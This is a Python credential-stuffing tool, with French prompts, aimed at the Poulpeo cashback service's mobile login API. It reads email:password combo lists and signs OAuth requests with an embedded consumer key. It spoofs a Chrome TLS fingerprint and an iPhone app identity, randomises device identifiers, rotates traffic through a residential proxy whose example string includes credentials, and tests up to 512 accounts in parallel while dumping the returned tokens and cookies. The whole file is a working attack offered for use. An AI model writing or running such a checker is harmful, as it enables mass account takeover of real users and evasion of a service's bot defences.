import builtins

import threading
import time
import uuid
import json
import hmac
import base64
import hashlib
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

import tls_client

from urllib.parse import parse_qs

_print_lock = threading.Lock()


def say(*args, **kwargs):
    with _print_lock:
        builtins.print(*args, **kwargs)

# =========================================================
# CONFIG
# =========================================================

CONSUMER_KEY = "als57b6d9bfbd8041.16892809"
CONSUMER_SECRET = "TON_CONSUMER_SECRET"

# =========================================================
# TLS SESSION FACTORY
# =========================================================


def new_session(proxy_url=None):
    session = tls_client.Session(
        client_identifier="chrome_131",
        random_tls_extension_order=True,
    )
    if proxy_url:
        session.proxies = {
            "http": proxy_url,
            "https": proxy_url,
        }
    return session


def parse_proxy_input(raw):
    raw = raw.strip().strip('"').strip("'")
    if not raw:
        return None
    parsed = urllib.parse.urlparse(raw)
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError(
            "Proxy invalide : utilisez par exemple "
            "http://utilisateur:motdepasse@gw.exemple.com:823"
        )
    return raw


COMMON_HEADERS = {
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "fr-FR,fr;q=0.9",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": (
        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) "
        "AppleWebKit/605.1.15 (KHTML, like Gecko) "
        "Mobile/15E148"
    ),
    "X-CLIENT-VERSION": "26.1.5",
    "Origin": "https://mobile.poulpeo.com",
    "Referer": "https://mobile.poulpeo.com/",
}

# =========================================================
# OAUTH SIGNER
# =========================================================


def build_oauth_header(
    method,
    url,
    consumer_key,
    consumer_secret,
    token=None,
    token_secret="",
    extra_params=None,
):

    oauth_params = {
        "oauth_consumer_key": consumer_key,
        "oauth_nonce": uuid.uuid4().hex,
        "oauth_signature_method": "HMAC-SHA1",
        "oauth_timestamp": str(int(time.time())),
        "oauth_version": "1.0",
    }

    if token:
        oauth_params["oauth_token"] = token

    signature_params = oauth_params.copy()

    if extra_params:
        for k, v in extra_params.items():
            signature_params[k] = v

    encoded_params = []

    for k, v in signature_params.items():

        encoded_key = urllib.parse.quote(str(k), safe="")
        encoded_value = urllib.parse.quote(str(v), safe="")

        encoded_params.append(
            (encoded_key, encoded_value)
        )

    encoded_params.sort()

    param_string = "&".join([
        f"{k}={v}"
        for k, v in encoded_params
    ])

    base_string = "&".join([
        method.upper(),
        urllib.parse.quote(url, safe=""),
        urllib.parse.quote(param_string, safe="")
    ])

    signing_key = (
        urllib.parse.quote(consumer_secret, safe="")
        + "&" +
        urllib.parse.quote(token_secret, safe="")
    )

    signature = base64.b64encode(
        hmac.new(
            signing_key.encode(),
            base_string.encode(),
            hashlib.sha1
        ).digest()
    ).decode()

    oauth_params["oauth_signature"] = signature

    auth_header = "OAuth " + ", ".join([
        f'{k}="{urllib.parse.quote(str(v))}"'
        for k, v in oauth_params.items()
    ])

    return auth_header

# =========================================================
# DEBUG RESPONSE
# =========================================================


def print_response(session, response):

    say("\n" + "=" * 70)
    say("STATUS CODE:")
    say(response.status_code)

    say("\nFINAL URL:")
    say(response.url)

    say("\nRESPONSE HEADERS:")
    for k, v in response.headers.items():
        say(f"{k}: {v}")

    say("\nRESPONSE COOKIES:")
    for cookie in session.cookies:
        say(f"{cookie.name} = {cookie.value}")

    say("\nRESPONSE SOURCE:")
    say(response.text)

    say("=" * 70 + "\n")

# =========================================================
# STEPS
# =========================================================

REQUEST_TOKEN_URL = (
    "https://mobile.poulpeo.com/api/2.2/oauth/requestToken/"
)

LOGIN_URL = (
    "https://mobile.poulpeo.com/api/2.2/user/login/"
)


def fetch_request_token(session):
    request_token_body = {
        "realm": REQUEST_TOKEN_URL
    }

    request_auth_header = build_oauth_header(
        method="POST",
        url=REQUEST_TOKEN_URL,
        consumer_key=CONSUMER_KEY,
        consumer_secret=CONSUMER_SECRET,
        extra_params=request_token_body
    )

    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = request_auth_header

    say("\nSENDING REQUEST TOKEN REQUEST...\n")

    response = session.post(
        REQUEST_TOKEN_URL,
        headers=headers,
        data=request_token_body
    )

    print_response(session, response)

    if response.status_code != 200:
        say("REQUEST TOKEN FAILED")
        return None

    parsed = parse_qs(response.text)

    oauth_token = parsed["oauth_token"][0]
    oauth_token_secret = parsed["oauth_token_secret"][0]

    say("OAUTH TOKEN:")
    say(oauth_token)

    say()

    say("OAUTH TOKEN SECRET:")
    say(oauth_token_secret)

    return oauth_token, oauth_token_secret


def try_login(session, oauth_token, oauth_token_secret, email, password):
    opendata = {
        "client_id": "als52f20495d05ac2.56394549",
        "application": {
            "advertiser_id": str(uuid.uuid4()).upper(),
            "version": "26.1.5"
        },
        "version": "2.0",
        "fp": str(uuid.uuid4()).upper(),
        "viewport": "smartphone"
    }

    login_body = {
        "email": email,
        "password": password,
        "realm": LOGIN_URL,
        "opendata": json.dumps(
            opendata,
            separators=(",", ":")
        )
    }

    login_auth_header = build_oauth_header(
        method="POST",
        url=LOGIN_URL,
        consumer_key=CONSUMER_KEY,
        consumer_secret=CONSUMER_SECRET,
        token=oauth_token,
        token_secret=oauth_token_secret,
        extra_params=login_body
    )

    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = login_auth_header

    say("\nSENDING LOGIN REQUEST...\n")

    response = session.post(
        LOGIN_URL,
        headers=headers,
        data=login_body
    )

    print_response(session, response)


def load_accounts_from_file(path):
    accounts = []
    with open(path, encoding="utf-8", errors="replace") as f:
        for lineno, raw in enumerate(f, start=1):
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            if ":" not in line:
                say(f"Ligne {lineno} ignorée (pas de ':'): {line[:80]}...")
                continue
            email, password = line.split(":", 1)
            email = email.strip()
            password = password.strip()
            if not email or not password:
                say(f"Ligne {lineno} ignorée (email ou mot de passe vide).")
                continue
            accounts.append((email, password))
    return accounts


def process_account(idx, total, email, password, proxy_url):
    say("\n" + "#" * 70)
    say(f"Compte {idx}/{total} — {email}")
    say("#" * 70)

    session = new_session(proxy_url)

    token_pair = fetch_request_token(session)
    if token_pair is None:
        say(f"REQUEST TOKEN FAILED pour {email}")
        return

    oauth_token, oauth_token_secret = token_pair

    try_login(session, oauth_token, oauth_token_secret, email, password)


def _run_account_task(task):
    idx, total, email, password, proxy_url = task
    try:
        process_account(idx, total, email, password, proxy_url)
    except Exception as e:
        say(f"Erreur pour {email} : {e!r}")


def main():
    path = input(
        "Chemin du fichier texte contenant les couples mail:pass "
        "(une ligne par compte, format email:motdepasse) : "
    ).strip().strip('"').strip("'")

    if not path:
        say("Aucun chemin fourni.")
        return

    proxy_in = input(
        "Proxy HTTP, format http://user:pass@host:port "
        "(ex. http://0dd9f8bb4e6fa2b4c384__cr.fr:93e22adb1bccfd1d@gw.dataimpulse.com:823) "
        "[Entrée vide = sans proxy] : "
    )
    try:
        proxy_url = parse_proxy_input(proxy_in)
    except ValueError as e:
        say(str(e))
        return

    threads_in = input("Nombre de threads : ").strip()
    try:
        num_threads = int(threads_in) if threads_in else 1
    except ValueError:
        say("Nombre de threads invalide, utilisation de 1.")
        num_threads = 1
    num_threads = max(1, min(num_threads, 512))

    try:
        accounts = load_accounts_from_file(path)
    except OSError as e:
        say(f"Impossible de lire le fichier : {e}")
        return

    if not accounts:
        say("Aucun compte valide trouvé dans le fichier.")
        return

    say(f"{len(accounts)} compte(s) à vérifier.")
    say(f"Proxy : {proxy_url or 'aucun (connexion directe)'}")
    say(f"Threads : {num_threads}\n")

    tasks = [
        (i + 1, len(accounts), email, password, proxy_url)
        for i, (email, password) in enumerate(accounts)
    ]

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        list(executor.map(_run_account_task, tasks))


if __name__ == "__main__":
    main()
